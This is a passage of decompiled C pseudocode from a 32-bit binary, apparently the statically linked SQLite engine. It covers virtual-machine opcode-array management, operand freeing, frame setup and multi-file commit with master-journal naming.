    return 7;
  }
  *a5 = 0;
  return 0;
}
// 1005A9D0: conditional instruction was optimized away because %var_8.4!=0
// 1005A952: variable 'v11' is possibly undefined

//----- (1005AA4D) --------------------------------------------------------
void __usercall sub_1005AA4D(int *a1@<esi>)
{
  if ( a1 )
  {
    sub_10059FC7(a1);
    sub_10058EC7(a1[4], (unsigned int)a1);
  }
}

//----- (1005AA64) --------------------------------------------------------
int __usercall sub_1005AA64@<eax>(int a1@<esi>)
{
  int result; // eax

  if ( (*(_BYTE *)(a1 + 28) & 0x10) != 0 )
    return *(_DWORD *)(a1 + 24);
  result = sub_1005A7DD(a1, 1u);
  if ( result )
    return *(_DWORD *)(a1 + 24);
  return result;
}

//----- (1005AA80) --------------------------------------------------------
_DWORD *__usercall sub_1005AA80@<eax>(int a1@<esi>)
{
  _DWORD *result; // eax
  int *v2; // ecx
  int v3; // edx
  int v4; // edx

  result = sub_1005904B(a1, 0xD8u);
  if ( result )
  {
    v2 = (int *)(a1 + 136);
    *result = a1;
    v3 = *(_DWORD *)(a1 + 136);
    if ( v3 )
      *(_DWORD *)(v3 + 4) = result;
    v4 = *v2;
    result[1] = 0;
    result[2] = v4;
    *v2 = (int)result;
    result[17] = 649915045;
  }
  return result;
}

//----- (1005AAB6) --------------------------------------------------------
int __usercall sub_1005AAB6@<eax>(int result@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v3; // esi
  int v4; // ecx
  int v5; // edi
  char v6[216]; // [esp+Ch] [ebp-D8h] BYREF

  qmemcpy(v6, (const void *)a2, sizeof(v6));
  qmemcpy((void *)a2, (const void *)result, 0xD8u);
  qmemcpy((void *)result, v6, 0xD8u);
  v2 = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(a2 + 8) = *(_DWORD *)(result + 8);
  v3 = *(_DWORD *)(result + 4);
  *(_DWORD *)(result + 8) = v2;
  v4 = *(_DWORD *)(a2 + 4);
  *(_DWORD *)(a2 + 4) = v3;
  *(_DWORD *)(result + 4) = v4;
  v5 = *(_DWORD *)(a2 + 176);
  *(_DWORD *)(a2 + 176) = *(_DWORD *)(result + 176);
  *(_DWORD *)(result + 176) = v5;
  *(_BYTE *)(result + 103) = *(_BYTE *)(a2 + 103);
  return result;
}

//----- (1005AB1C) --------------------------------------------------------
int __usercall sub_1005AB1C@<eax>(int a1@<esi>)
{
  int v1; // eax
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  unsigned int v5; // eax

  v1 = *(_DWORD *)(a1 + 16);
  if ( v1 )
    v2 = 2 * v1;
  else
    v2 = 51;
  v3 = sub_100590DA(*(_DWORD *)a1, *(void **)(a1 + 20), 20 * v2);
  v4 = v3;
  if ( v3 )
  {
    v5 = sub_10058E55((unsigned int)v3);
    *(_DWORD *)(a1 + 20) = v4;
    *(_DWORD *)(a1 + 16) = v5 / 0x14;
  }
  return v4 != 0 ? 0 : 7;
}

//----- (1005AB66) --------------------------------------------------------
int __usercall sub_1005AB66@<eax>(int a1@<eax>, char a2, int a3, int a4, int a5)
{
  int v6; // edi
  int v8; // eax

  v6 = *(_DWORD *)(a1 + 12);
  if ( *(_DWORD *)(a1 + 16) <= v6 && sub_1005AB1C(a1) )
    return 1;
  ++*(_DWORD *)(a1 + 12);
  v8 = *(_DWORD *)(a1 + 20) + 20 * v6;
  *(_DWORD *)(v8 + 4) = a3;
  *(_BYTE *)v8 = a2;
  *(_DWORD *)(v8 + 8) = a4;
  *(_BYTE *)(v8 + 3) = 0;
  *(_DWORD *)(v8 + 12) = a5;
  *(_DWORD *)(v8 + 16) = 0;
  *(_BYTE *)(v8 + 1) = 0;
  *(_BYTE *)(a1 + 98) = 0;
  return v6;
}

//----- (1005ABB9) --------------------------------------------------------
int __cdecl sub_1005ABB9(int a1, char a2)
{
  return sub_1005AB66(a1, a2, 0, 0, 0);
}

//----- (1005ABD1) --------------------------------------------------------
int __usercall sub_1005ABD1@<eax>(int a1@<eax>, char a2, int a3)
{
  return sub_1005AB66(a1, a2, a3, 0, 0);
}

//----- (1005ABE8) --------------------------------------------------------
int __usercall sub_1005ABE8@<eax>(int a1@<eax>, char a2, int a3, int a4)
{
  return sub_1005AB66(a1, a2, a3, a4, 0);
}

//----- (1005AC02) --------------------------------------------------------
int __cdecl sub_1005AC02(int *a1, char a2, int a3, int a4, int a5, unsigned __int16 *Src, _BYTE *a7)
{
  int v7; // esi

  v7 = sub_1005AB66((int)a1, a2, a3, a4, a5);
  sub_1005AFA8(v7, a1, Src, a7);
  return v7;
}

//----- (1005AC32) --------------------------------------------------------
int __cdecl sub_1005AC32(int *a1, char a2, int a3, int a4, int a5, unsigned __int16 *Src)
{
  int v6; // esi

  v6 = sub_1005AB66((int)a1, a2, a3, a4, a5);
  sub_1005AFA8(v6, a1, Src, (_BYTE *)0xFFFFFFF2);
  return v6;
}

//----- (1005AC63) --------------------------------------------------------
int __usercall sub_1005AC63@<eax>(int a1@<eax>)
{
  int v2; // edi
  int v3; // eax
  _DWORD *v4; // eax
  int v5; // esi

  v2 = *(_DWORD *)(a1 + 24);
  *(_DWORD *)(a1 + 24) = v2 + 1;
  v3 = *(_DWORD *)(a1 + 28);
  if ( v2 >= v3 )
  {
    v4 = sub_10059167(*(_DWORD *)a1, *(void **)(a1 + 32), 4 * (2 * v3 + 5));
    *(_DWORD *)(a1 + 32) = v4;
    *(_DWORD *)(a1 + 28) = (unsigned int)sub_10058E55((unsigned int)v4) >> 2;
  }
  v5 = *(_DWORD *)(a1 + 32);
  if ( v5 )
    *(_DWORD *)(v5 + 4 * v2) = -1;
  return -1 - v2;
}

//----- (1005ACAF) --------------------------------------------------------
_DWORD *__fastcall sub_1005ACAF(int a1, int a2)
{
  _DWORD *result; // eax

  result = *(_DWORD **)(a1 + 32);
  if ( result )
  {
    result += -a2 - 1;
    *result = *(_DWORD *)(a1 + 12);
  }
  return result;
}

//----- (1005ACC5) --------------------------------------------------------
_DWORD *__usercall sub_1005ACC5@<eax>(int a1@<esi>, _DWORD *a2)
{
  int v2; // ecx
  int v3; // edi
  unsigned __int8 *v4; // eax
  char v5; // dl
  bool v6; // zf
  int v7; // edx
  int v8; // edx
  _DWORD *result; // eax
  int v10; // [esp+4h] [ebp-4h]

  v2 = *(_DWORD *)(a1 + 12) - 1;
  v3 = *a2;
  v10 = *(_DWORD *)(a1 + 32);
  v4 = *(unsigned __int8 **)(a1 + 20);
  *(_BYTE *)(a1 + 102) = 1;
  if ( v2 >= 0 )
  {
    while ( 1 )
    {
      v5 = *v4;
      v6 = *v4 == 18;
      v4[2] = byte_100FF0C0[*v4];
      if ( v6 || v5 == 115 )
        break;
      switch ( v5 )
      {
        case 34:
          if ( *((_DWORD *)v4 + 2) )
            *(_BYTE *)(a1 + 102) = 0;
          break;
        case -127:
          v7 = *((_DWORD *)v4 + 2);
          goto LABEL_12;
        case 125:
          v7 = *((_DWORD *)v4 - 4);
          goto LABEL_12;
      }
LABEL_14:
      if ( (v4[2] & 1) != 0 )
      {
        v8 = *((_DWORD *)v4 + 2);
        if ( v8 < 0 )
          *((_DWORD *)v4 + 2) = *(_DWORD *)(v10 - (4 * v8 + 4));
      }
      --v2;
      v4 += 20;
      if ( v2 < 0 )
        goto LABEL_18;
    }
    v7 = v4[3];
LABEL_12:
    if ( v7 > v3 )
      v3 = v7;
    goto LABEL_14;
  }
LABEL_18:
  sub_10058EC7(*(_DWORD *)a1, *(_DWORD *)(a1 + 32));
  result = a2;
  *(_DWORD *)(a1 + 32) = 0;
  *a2 = v3;
  return result;
}

//----- (1005AD69) --------------------------------------------------------
int __usercall sub_1005AD69@<eax>(_DWORD *a1@<eax>, int a2, int a3)
{
  int v3; // ebx
  char *v6; // edx
  int v7; // edi
  int v8; // eax
  unsigned __int8 *v9; // ecx
  bool v10; // zf
  int v11; // [esp+10h] [ebp-8h]
  int v12; // [esp+14h] [ebp-4h]

  v3 = a2;
  if ( a2 + a1[3] > a1[4] && sub_1005AB1C((int)a1) )
    return 0;
  v11 = a1[3];
  if ( a2 > 0 )
  {
    v6 = (char *)(a3 + 1);
    v7 = 20 * a1[3];
    v12 = a2;
    do
    {
      v8 = v6[1];
      v9 = (unsigned __int8 *)(v7 + a1[5]);
      *v9 = *(v6 - 1);
      *((_DWORD *)v9 + 1) = *v6;
      if ( v8 < 0 && (byte_100FF0C0[*v9] & 1) != 0 )
        v8 = v11 - v8 - 1;
      *((_DWORD *)v9 + 2) = v8;
      *((_DWORD *)v9 + 3) = v6[2];
      v7 += 20;
      v6 += 4;
      v10 = v12-- == 1;
      v9[1] = 0;
      *((_DWORD *)v9 + 4) = 0;
      v9[3] = 0;
    }
    while ( !v10 );
    v3 = a2;
  }
  a1[3] += v3;
  return v11;
}

//----- (1005ADFE) --------------------------------------------------------
int __usercall sub_1005ADFE@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( *(_DWORD *)(a3 + 12) > result )
  {
    result *= 20;
    *(_DWORD *)(*(_DWORD *)(a3 + 20) + result + 4) = a2;
  }
  return result;
}

//----- (1005AE0E) --------------------------------------------------------
int __fastcall sub_1005AE0E(int a1, char a2)
{
  int result; // eax

  result = *(_DWORD *)(a1 + 20);
  if ( result )
    *(_BYTE *)(20 * *(_DWORD *)(a1 + 12) + result - 17) = a2;
  return result;
}

//----- (1005AE20) --------------------------------------------------------
int __usercall sub_1005AE20@<eax>(int result@<eax>, int a2@<edx>)
{
  int v2; // ecx

  v2 = *(_DWORD *)(a2 + 12);
  if ( v2 > result )
  {
    result *= 20;
    *(_DWORD *)(*(_DWORD *)(a2 + 20) + result + 8) = v2;
  }
  return result;
}

//----- (1005AE32) --------------------------------------------------------
void __cdecl sub_1005AE32(int a1, int a2, unsigned int a3)
{
  if ( a3 )
  {
    switch ( a2 )
    {
      case -18:
        sub_1005AF29((_DWORD *)a3, a1, 1);
        return;
      case -16:
      case -15:
      case -13:
      case -12:
      case -11:
      case -6:
      case -1:
        goto LABEL_3;
      case -10:
        sub_10070EB6((int *)a3);
        return;
      case -8:
        sub_1005AA4D((int *)a3);
        return;
      case -7:
        if ( *(_DWORD *)a3 )
        {
          if ( (*(_BYTE *)(*(_DWORD *)a3 + 3) & 4) != 0 )
            sub_10058EC7(a1, *(_DWORD *)a3);
        }
        sub_1005BD8A(a3, 0);
        goto LABEL_3;
      case -5:
        if ( (*(_BYTE *)(a3 + 3) & 4) != 0 )
LABEL_3:
          sub_10058EC7(a1, a3);
        break;
      default:
        return;
    }
  }
}

//----- (1005AEE0) --------------------------------------------------------
void __usercall sub_1005AEE0(int a1@<eax>, unsigned int a2@<ebx>, int a3)
{
  unsigned int v3; // eax
  char *v4; // esi
  unsigned int v5; // edi

  if ( a2 )
  {
    v3 = a2 + 20 * a1;
    if ( a2 < v3 )
    {
      v4 = (char *)(a2 + 1);
      v5 = (v3 - a2 - 1) / 0x14 + 1;
      do
      {
        sub_1005AE32(a3, *v4, *(_DWORD *)(v4 + 15));
        v4 += 20;
        --v5;
      }
      while ( v5 );
    }
  }
  sub_10058EC7(a3, a2);
}

//----- (1005AF29) --------------------------------------------------------
void __usercall sub_1005AF29(_DWORD *a1@<esi>, int a2, int a3)
{
  if ( a1 )
  {
    if ( a3 || a1[4] == 1 )
    {
      *a1 = 0;
      sub_1005AEE0(a2);
      a1[1] = 0;
    }
    if ( a1[4]-- == 1 )
      sub_10058EC7(a2, (unsigned int)a1);
  }
}
// 1005AEE0: using guessed type _DWORD __cdecl sub_1005AEE0(_DWORD);

//----- (1005AF65) --------------------------------------------------------
int *__usercall sub_1005AF65@<eax>(int *result@<eax>, int a2@<ecx>, int a3)
{
  int v4; // ecx
  int v5; // edi
  _BYTE *v6; // esi

  v4 = result[5];
  if ( v4 )
  {
    v5 = *result;
    v6 = (_BYTE *)(v4 + 20 * a2);
    do
    {
      --a3;
      sub_1005AE32(v5, (char)v6[1], *((_DWORD *)v6 + 4));
      result = (int *)memset(v6, 0, 0x14u);
      *v6 = -123;
      v6 += 20;
    }
    while ( a3 );
  }
  return result;
}

//----- (1005AFA8) --------------------------------------------------------
void __usercall sub_1005AFA8(int a1@<eax>, int *a2, unsigned __int16 *Src, _BYTE *a4)
{
  int v4; // ecx
  int v6; // eax
  int v7; // esi
  _BYTE *v8; // eax
  void *v9; // ecx
  _DWORD *v10; // eax
  _DWORD *v11; // ebx
  const void *v12; // ecx
  char *v13; // [esp-Ch] [ebp-20h]
  size_t Size; // [esp+10h] [ebp-4h]

  v4 = a2[5];
  v6 = *a2;
  if ( !v4 || *(_BYTE *)(v6 + 30) )
  {
    if ( a4 != (_BYTE *)-6 && a4 != (_BYTE *)-10 )
      sub_1005AE32(v6, (int)a4, (unsigned int)Src);
  }
  else
  {
    if ( a1 < 0 )
      a1 = a2[3] - 1;
    v7 = v4 + 20 * a1;
    sub_1005AE32(v6, *(char *)(v7 + 1), *(_DWORD *)(v7 + 16));
    v8 = a4;
    *(_DWORD *)(v7 + 16) = 0;
    if ( a4 == (_BYTE *)-14 )
    {
      *(_DWORD *)(v7 + 16) = Src;
      *(_BYTE *)(v7 + 1) = -14;
      return;
    }
    v9 = Src;
    if ( !Src )
    {
      *(_DWORD *)(v7 + 16) = 0;
LABEL_14:
      *(_BYTE *)(v7 + 1) = 0;
      return;
    }
    if ( a4 == (_BYTE *)-6 )
    {
      Size = Src[3];
      v10 = (_DWORD *)sub_10058C4C(5 * Size + 12);
      v11 = v10;
      *(_DWORD *)(v7 + 16) = v10;
      if ( !v10 )
      {
        *(_BYTE *)(*a2 + 30) = 1;
        goto LABEL_14;
      }
      memcpy(v10, Src, 5 * Size + 12);
      v12 = (const void *)v11[2];
      if ( v12 )
      {
        v13 = (char *)&v11[Size + 3];
        v11[2] = v13;
        memcpy(v13, v12, Size);
      }
      goto LABEL_17;
    }
    if ( a4 == (_BYTE *)-16 )
    {
      *(_DWORD *)(v7 + 16) = Src;
LABEL_17:
      *(_BYTE *)(v7 + 1) = -6;
      return;
    }
    if ( a4 == (_BYTE *)-10 )
    {
      *(_DWORD *)(v7 + 16) = Src;
      *(_BYTE *)(v7 + 1) = -10;
      ++*((_DWORD *)Src + 3);
    }
    else if ( (int)a4 >= 0 )
    {
      if ( !a4 )
        v8 = sub_10059297(Src);
      *(_DWORD *)(v7 + 16) = sub_100591D0(*a2, (size_t)v8, v9);
      *(_BYTE *)(v7 + 1) = -1;
    }
    else
    {
      *(_DWORD *)(v7 + 16) = Src;
      *(_BYTE *)(v7 + 1) = (_BYTE)a4;
    }
  }
}
// 1005B0A6: variable 'v9' is possibly undefined

//----- (1005B0D5) --------------------------------------------------------
void *__usercall sub_1005B0D5@<eax>(int a1@<eax>, _DWORD *a2@<ecx>)
{
  int v2; // eax

  if ( a1 < 0 )
  {
    v2 = a2[3];
    if ( !v2 )
      return &unk_101842F8;
    a1 = v2 - 1;
  }
  if ( *(_BYTE *)(*a2 + 30) )
    return &unk_101842F8;
  return (void *)(a2[5] + 20 * a1);
}

//----- (1005B0F6) --------------------------------------------------------
int *__fastcall sub_1005B0F6(int a1, int *a2)
{
  int *result; // eax

  result = (int *)a2[27];
  if ( ((unsigned int)result & (1 << a1)) == 0 )
  {
    a2[27] = (1 << a1) | (unsigned int)result;
    return sub_10068D82(a2 + 30, *(_DWORD *)(*(_DWORD *)(*a2 + 8) + 16 * a1 + 4));
  }
  return result;
}

//----- (1005B11E) --------------------------------------------------------
void __usercall sub_1005B11E(int a1@<eax>, unsigned int a2@<ecx>)
{
  unsigned int v2; // esi
  int v3; // edi
  char v4; // bl
  unsigned int v5; // [esp+Ch] [ebp-4h]

  v2 = a2;
  if ( a2 && a1 )
  {
    v3 = *(_DWORD *)(a2 + 16);
    v4 = *(_BYTE *)(v3 + 30);
    v5 = a2 + 40 * a1;
    if ( a2 < v5 )
    {
      do
      {
        if ( (*(_WORD *)(v2 + 28) & 0x2460) != 0 )
        {
          sub_10059FC7((int *)v2);
        }
        else if ( *(_DWORD *)(v2 + 36) )
        {
          sub_10058EC7(v3, *(_DWORD *)(v2 + 36));
          *(_DWORD *)(v2 + 36) = 0;
        }
        *(_WORD *)(v2 + 28) = 1;
        v2 += 40;
      }
      while ( v2 < v5 );
    }
    *(_BYTE *)(v3 + 30) = v4;
  }
}

//----- (1005B17B) --------------------------------------------------------
void __usercall sub_1005B17B(int *a1@<ebx>)
{
  int i; // esi
  int v2; // [esp+Ch] [ebp-4h]

  v2 = 0;
  for ( i = (int)&a1[10 * a1[9] + 16]; v2 < a1[10]; ++v2 )
    sub_1005B3D0(*(_DWORD *)(i + 4 * v2), *a1);
  sub_1005B11E(a1[9], (unsigned int)(a1 + 16));
  sub_10058EC7(*(_DWORD *)*a1, (unsigned int)a1);
}

//----- (1005B1CA) --------------------------------------------------------
int __usercall sub_1005B1CA@<eax>(int result@<eax>, int a2@<ecx>, _DWORD *a3@<ebx>, int *a4@<edi>, unsigned int a5)
{
  unsigned int v5; // ecx

  if ( !result )
  {
    v5 = (a2 + 7) & 0xFFFFFFF8;
    if ( *a4 + v5 > a5 )
    {
      *a3 += v5;
    }
    else
    {
      result = *a4;
      *a4 += v5;
    }
  }
  return result;
}

//----- (1005B1ED) --------------------------------------------------------
int __usercall sub_1005B1ED@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5, int a6, char a7)
{
  int v8; // eax
  int v9; // eax
  unsigned int v10; // ebx
  void *v11; // edi
  bool v12; // zf
  int v13; // ecx
  int v14; // eax
  int v15; // eax
  size_t v16; // edi
  int v17; // ebx
  int v18; // ecx
  int v19; // eax
  int v20; // eax
  int v21; // ecx
  int v22; // eax
  int result; // eax
  int v24; // [esp+Ch] [ebp-1Ch]
  int v25; // [esp+18h] [ebp-10h]
  unsigned int v26; // [esp+1Ch] [ebp-Ch]
  int i; // [esp+20h] [ebp-8h] BYREF
  size_t Size; // [esp+24h] [ebp-4h] BYREF
  int v29; // [esp+34h] [ebp+Ch]

  v29 = a4 + a3;
  v8 = *(_DWORD *)a1;
  v25 = v8;
  *(_DWORD *)(a1 + 68) = -1108210269;
  if ( a2 >= 0 && !*(_BYTE *)(v8 + 30) )
  {
    v9 = *(_DWORD *)(a1 + 20);
    v10 = v9 + 20 * *(_DWORD *)(a1 + 16);
    v11 = (void *)(v9 + 20 * *(_DWORD *)(a1 + 12));
    v26 = v10;
    sub_1005ACC5(a1, &a5);
    v12 = a6 == 0;
    *(_BYTE *)(a1 + 101) = a7;
    if ( !v12 && v29 < 10 )
      v29 = 10;
    memset(v11, 0, v10 - (_DWORD)v11);
    v13 = 40 * v29;
    v24 = 4 * a5;
    for ( i = (int)v11 + ((unsigned __int8)v11 & 7); ; v10 = v16 + i )
    {
      v14 = *(_DWORD *)(a1 + 76);
      Size = 0;
      *(_DWORD *)(a1 + 76) = sub_1005B1CA(v14, v13, &Size, &i, v10);
      *(_DWORD *)(a1 + 60) = sub_1005B1CA(*(_DWORD *)(a1 + 60), 40 * a2, &Size, &i, v26);
      *(_DWORD *)(a1 + 36) = sub_1005B1CA(*(_DWORD *)(a1 + 36), v24, &Size, &i, v26);
      *(_DWORD *)(a1 + 64) = sub_1005B1CA(*(_DWORD *)(a1 + 64), 4 * a2, &Size, &i, v26);
      v15 = sub_1005B1CA(*(_DWORD *)(a1 + 52), 4 * a4, &Size, &i, v26);
      v16 = Size;
      v17 = v25;
      v12 = Size == 0;
      *(_DWORD *)(a1 + 52) = v15;
      if ( !v12 )
        *(_DWORD *)(a1 + 180) = sub_1005904B(v25, v16);
      i = *(_DWORD *)(a1 + 180);
      v26 = v16 + i;
      if ( !v16 )
        break;
      if ( *(_BYTE *)(v25 + 30) )
      {
        v17 = v25;
        break;
      }
      v13 = 40 * v29;
    }
    v12 = *(_DWORD *)(a1 + 60) == 0;
    *(_WORD *)(a1 + 50) = a4;
    if ( !v12 )
    {
      v18 = a2;
      *(_WORD *)(a1 + 58) = a2;
      if ( a2 > 0 )
      {
        v19 = 0;
        do
        {
          *(_WORD *)(*(_DWORD *)(a1 + 60) + v19 + 28) = 1;
          *(_DWORD *)(*(_DWORD *)(a1 + 60) + v19 + 16) = v17;
          v19 += 40;
          --v18;
        }
        while ( v18 );
      }
    }
    v20 = *(_DWORD *)(a1 + 76);
    if ( v20 )
    {
      v21 = v29;
      *(_DWORD *)(a1 + 76) = v20 - 40;
      *(_DWORD *)(a1 + 72) = v29;
      if ( v29 >= 1 )
      {
        v22 = 40;
        do
        {
          *(_WORD *)(*(_DWORD *)(a1 + 76) + v22 + 28) = 1;
          *(_DWORD *)(*(_DWORD *)(a1 + 76) + v22 + 16) = v17;
          v22 += 40;
          --v21;
        }
        while ( v21 );
      }
    }
  }
  *(_DWORD *)(a1 + 84) = -1;
  result = 0;
  *(_BYTE *)(a1 + 96) |= a6;
  *(_DWORD *)(a1 + 88) = 0;
  *(_BYTE *)(a1 + 56) = 2;
  *(_DWORD *)(a1 + 68) = -1108210269;
  *(_DWORD *)(a1 + 104) = 0;
  *(_DWORD *)(a1 + 80) = 1;
  *(_BYTE *)(a1 + 99) = -1;
  *(_DWORD *)(a1 + 200) = 0;
  return result;
}

//----- (1005B3D0) --------------------------------------------------------
int __usercall sub_1005B3D0@<eax>(int result@<eax>, int a2@<edi>)
{
  int *v2; // esi
  int v3; // eax
  int v4; // esi

  v2 = (int *)result;
  if ( result )
  {
    v3 = *(_DWORD *)(result + 32);
    if ( v3 )
    {
      sub_1006256A(v3);
    }
    else if ( *v2 )
    {
      sub_1006345E(*v2);
    }
    result = v2[14];
    if ( result )
    {
      v4 = v2[15];
      *(_BYTE *)(a2 + 100) = 1;
      result = (*(int (__cdecl **)(int))(v4 + 28))(result);
      *(_BYTE *)(a2 + 100) = 0;
    }
  }
  return result;
}

//----- (1005B409) --------------------------------------------------------
int *__usercall sub_1005B409@<eax>(int **a1@<eax>)
{
  int *v1; // ecx
  int v2; // edx

  v1 = *a1;
  v1[5] = (int)a1[2];
  v1[3] = (int)a1[3];
  v1[19] = (int)a1[4];
  v1[18] = (int)a1[5];
  v1[13] = (int)a1[6];
  *((_WORD *)v1 + 25) = *((_WORD *)a1 + 14);
  v2 = *v1;
  *(_DWORD *)(v2 + 48) = a1[12];
  *(_DWORD *)(v2 + 52) = a1[13];
  v1[26] = (int)a1[14];
  return a1[1];
}

//----- (1005B44B) --------------------------------------------------------
void __usercall sub_1005B44B(int a1@<eax>)
{
  int v2; // eax
  bool v3; // zf
  int v4; // esi
  int v5; // eax
  int v6; // eax

  v2 = *(_DWORD *)(a1 + 204);
  if ( v2 )
  {
    while ( *(_DWORD *)(v2 + 60) )
      v2 = *(_DWORD *)(v2 + 60);
    sub_1005B409((int **)v2);
  }
  v3 = *(_DWORD *)(a1 + 52) == 0;
  *(_DWORD *)(a1 + 204) = 0;
  *(_DWORD *)(a1 + 208) = 0;
  if ( !v3 )
  {
    v4 = 0;
    if ( *(_WORD *)(a1 + 50) )
    {
      do
      {
        v5 = *(_DWORD *)(*(_DWORD *)(a1 + 52) + 4 * v4);
        if ( v5 )
        {
          sub_1005B3D0(v5, a1);
          *(_DWORD *)(*(_DWORD *)(a1 + 52) + 4 * v4) = 0;
        }
        ++v4;
      }
      while ( v4 < *(unsigned __int16 *)(a1 + 50) );
    }
  }
  v6 = *(_DWORD *)(a1 + 76);
  if ( v6 )
    sub_1005B11E(*(_DWORD *)(a1 + 72), v6 + 40);
}

//----- (1005B4BC) --------------------------------------------------------
_DWORD *__usercall sub_1005B4BC@<eax>(int a1@<edi>, int a2@<esi>)
{
  int v2; // ebx
  int v3; // ebx
  _DWORD *result; // eax
  int v5; // [esp+4h] [ebp-4h]

  v2 = *(_DWORD *)a2;
  v5 = *(_DWORD *)a2;
  sub_1005B11E(2 * *(unsigned __int16 *)(a2 + 48), *(_DWORD *)(a2 + 40));
  sub_10058EC7(v2, *(_DWORD *)(a2 + 40));
  v3 = 2 * a1;
  *(_WORD *)(a2 + 48) = a1;
  result = sub_1005904B(v5, 80 * a1);
  *(_DWORD *)(a2 + 40) = result;
  if ( result && v3 > 0 )
  {
    result += 4;
    do
    {
      *((_WORD *)result + 6) = 1;
      --v3;
      *result = *(_DWORD *)a2;
      result += 10;
    }
    while ( v3 > 0 );
  }
  return result;
}

//----- (1005B518) --------------------------------------------------------
int __usercall sub_1005B518@<eax>(
        int a1@<eax>,
        int a2,
        int a3,
        _BYTE *Src,
        void (__cdecl *a5)(int a1, unsigned int a2))
{
  if ( *(_BYTE *)(*(_DWORD *)a1 + 30) )
    return 7;
  else
    return sub_1005A3FE(a5, *(_DWORD *)(a1 + 40) + 40 * (a2 + a3 * *(unsigned __int16 *)(a1 + 48)), -1, Src, 1);
}

//----- (1005B54D) --------------------------------------------------------
int __usercall sub_1005B54D@<eax>(int a1@<eax>, int *a2@<ecx>)
{
  int v3; // ebx
  int result; // eax
  int v5; // edi
  int *v6; // ecx
  int v7; // edx
  int v8; // ecx
  int (__cdecl *v9)(int); // eax
  int v10; // edx
  const char *v11; // eax
  int v12; // ebx
  int v13; // eax
  int v14; // edi
  int v15; // ecx
  int v16; // edi
  _BYTE *v17; // eax
  int v18; // ecx
  _BYTE *v19; // eax
  int v20; // eax
  int i; // ebx
  int v22; // eax
  int v23; // ebx
  int v24; // edi
  int v25; // eax
  int v26; // ebx
  int v27; // edi
  int v28; // eax
  __int64 v29; // [esp-8h] [ebp-40h]
  char *v31; // [esp+Ch] [ebp-2Ch]
  int v32; // [esp+10h] [ebp-28h]
  int v33; // [esp+10h] [ebp-28h]
  int v34; // [esp+10h] [ebp-28h]
  int v35; // [esp+14h] [ebp-24h] BYREF
  const char *v36; // [esp+18h] [ebp-20h]
  int v37; // [esp+1Ch] [ebp-1Ch]
  unsigned int v38; // [esp+20h] [ebp-18h] BYREF
  int v39; // [esp+24h] [ebp-14h] BYREF
  int v40; // [esp+28h] [ebp-10h]
  int v41; // [esp+2Ch] [ebp-Ch]
  __int64 v42; // [esp+30h] [ebp-8h]

  v3 = 0;
  v35 = 0;
  result = sub_1007168E((int)a2, (unsigned int *)(a1 + 92));
  v32 = result;
  if ( result )
    return result;
  v5 = 0;
  if ( a2[1] <= 0 )
    goto LABEL_14;
  v6 = (int *)(a2[2] + 4);
  do
  {
    if ( sub_10066C14(*v6) )
    {
      v3 = 1;
      if ( v5 != 1 )
        ++v35;
    }
    ++v5;
    v6 = (int *)(v8 + 16);
  }
  while ( v5 < v7 );
  if ( !v3 || (v9 = (int (__cdecl *)(int))a2[42]) == 0 || (v32 = v9(a2[41])) == 0 )
  {
LABEL_14:
    if ( sub_10059297(*(_BYTE **)(**(_DWORD **)(*(_DWORD *)(a2[2] + 4) + 4) + 132)) && v35 > 1 )
    {
      v11 = *(const char **)(**(_DWORD **)(*(_DWORD *)(v10 + 4) + 4) + 132);
      v12 = *a2;
      v37 = 0;
      v31 = 0;
      v36 = v11;
      v35 = 0;
      v42 = 0i64;
      do
      {
        sub_10058EC7((int)a2, (unsigned int)v31);
        sub_10069AB6((char *)&v38, 4);
        v13 = sub_10055484((int)a2, "%s-mj%08X", v36, v38 & 0x7FFFFFFF);
        v31 = (char *)v13;
        if ( !v13 )
          return 7;
        v14 = (*(int (__cdecl **)(int, int, _DWORD, int *))(v12 + 32))(v12, v13, 0, &v39);
        if ( v14 )
          goto LABEL_22;
      }
      while ( v39 );
      v14 = sub_10067472(v12, (int)v31, &v35);
      if ( v14 )
        goto LABEL_22;
      v33 = 0;
      if ( a2[1] > 0 )
      {
        v36 = 0;
        do
        {
          v41 = *(_DWORD *)&v36[a2[2] + 4];
          if ( sub_10066C14(v41) )
          {
            v40 = *(_DWORD *)(v15 + 4);
            v38 = *(_DWORD *)(*(_DWORD *)v40 + 136);
            if ( v38 )
            {
              if ( *(_BYTE *)v38 )
              {
                if ( !v37 )
                {
                  sub_10068C39(v15);
                  v16 = *(unsigned __int8 *)(*(_DWORD *)v40 + 8);
                  sub_10068CA7(v41);
                  if ( !v16 )
                    v37 = 1;
                }
                v29 = v42;
                v17 = sub_10059297((_BYTE *)v38);
                v14 = sub_10067419(v35, v18, (int)(v17 + 1), v29, SHIDWORD(v29));
                v19 = sub_10059297((_BYTE *)v38);
                v42 += (int)(v19 + 1);
                if ( v14 )
                  goto LABEL_49;
              }
            }
          }
          ++v33;
          v36 += 16;
        }
        while ( v33 < a2[1] );
        if ( v37 )
        {
          if ( ((*(int (__cdecl **)(int))(*(_DWORD *)v35 + 48))(v35) & 0x400) == 0 )
          {
            v14 = (*(int (__cdecl **)(int, int))(*(_DWORD *)v35 + 20))(v35, 2);
            if ( v14 )
            {
LABEL_49:
              sub_100674B8(v35);
              (*(void (__cdecl **)(int, char *, _DWORD))(v12 + 28))(v12, v31, 0);
              goto LABEL_22;
            }
          }
        }
      }
      v34 = 0;
      v37 = 0;
      do
      {
        if ( v34 >= a2[1] )
          break;
        v20 = *(_DWORD *)(v37 + a2[2] + 4);
        if ( v20 )
          v14 = sub_1006313A(v20, v31);
        ++v34;
        v37 += 16;
      }
      while ( !v14 );
      sub_100674B8(v35);
      if ( v14 )
      {
LABEL_22:
        sub_10058EC7((int)a2, (unsigned int)v31);
        return v14;
      }
      v32 = (*(int (__cdecl **)(int, char *, int))(v12 + 28))(v12, v31, 1);
      sub_10058EC7((int)a2, (unsigned int)v31);
      if ( v32 )
        return v32;
      sub_10069106();
      for ( i = 0; i < a2[1]; v14 += 16 )
      {
        v22 = *(_DWORD *)(v14 + a2[2] + 4);
        if ( v22 )
          sub_100631FC(v22);
        ++i;
      }
      sub_10069112();
    }
    else
    {
      v23 = 0;
      v24 = 0;
      do
      {
        if ( v23 >= a2[1] )
          break;
        v25 = *(_DWORD *)(v24 + a2[2] + 4);
        if ( v25 )
          v32 = sub_1006313A(v25, 0);
        ++v23;
        v24 += 16;
      }
